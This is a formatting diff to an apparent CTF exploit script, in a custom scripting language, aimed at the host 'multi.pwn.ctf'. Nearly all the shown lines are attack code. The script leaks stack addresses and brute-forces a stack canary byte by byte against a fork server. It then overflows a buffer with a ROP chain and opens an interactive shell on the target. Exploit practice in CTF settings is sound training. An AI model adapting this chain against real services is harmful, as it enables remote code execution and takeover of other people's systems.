@@ -1,4 +1,4 @@
-﻿# Multi-stage exploitation - chaining multiple vulns
+# Multi-stage exploitation - chaining multiple vulns
 # Realistic CTF scenario with multiple steps
 
 let host = "multi.pwn.ctf"
@@ -27,7 +27,8 @@ let stack_leak = recv_until(conn, "\n")
 let leaked_addrs = split(stack_leak, ".")
 
 print("[+] Leaked stack addresses:")
-for addr in leaked_addrs {    print("   ", addr)
+for addr in leaked_addrs {
+    print("   ", addr)
 }
 # Extract useful addresses
 let stack_addr = int(leaked_addrs[0], 16)
@@ -45,7 +46,7 @@ print("\n[STAGE 2] Canary Bypass")
 print("==================================================")
 
 # Fork server preserves canary - brute force byte by byte
-define function leak_canary()
+define function leak_canary() {
     let canary = []
     let offset = 40  # Offset to canary
     
@@ -53,14 +54,18 @@ define function leak_canary()
     canary = [0x00]
     
     # Brute force remaining 7 bytes
-    for byte_pos in range(1, 8)
-        for guess in range(0, 256)
+    for byte_pos in range(1, 8) {
+        for guess in range(0, 256) {
             let payload = "A" * offset + bytes(canary) + bytes([guess])
             
             send(conn, payload)
             let response = recv(conn, 1024, timeout: 1)
             
-            if "Error" not in str(response) {                # Correct byte, server didn't crash {                canary = canary + [guess] {                print("[+] Canary byte", byte_pos, ":", hex(guess)) {                break
+            if "Error" not in str(response) {
+                # Correct byte, server didn't crash
+                canary = canary + [guess]
+                print("[+] Canary byte", byte_pos, ":", hex(guess))
+                break
             }
         }
     }
@@ -105,7 +110,8 @@ payload = payload + bytes(canary)
 payload = payload + "B" * 8  # Saved RBP
 
 # Add ROP chain
-for gadget in leak_chain {    payload = payload + p64(gadget)
+for gadget in leak_chain {
+    payload = payload + p64(gadget)
 }
 send(conn, payload)
 
@@ -151,7 +157,9 @@ print("[+] Dropping to interactive shell...")
 send(conn, "id\n")
 let shell_check = recv(conn, 1024)
 
-if "uid=" in str(shell_check) {    print("[+] SUCCESS! Got shell!")
+if "uid=" in str(shell_check) {
+    print("[+] SUCCESS! Got shell!")
     interactive(conn)
-} else {    print("[-] Shell failed, debugging required")
+} else {
+    print("[-] Shell failed, debugging required")
 }
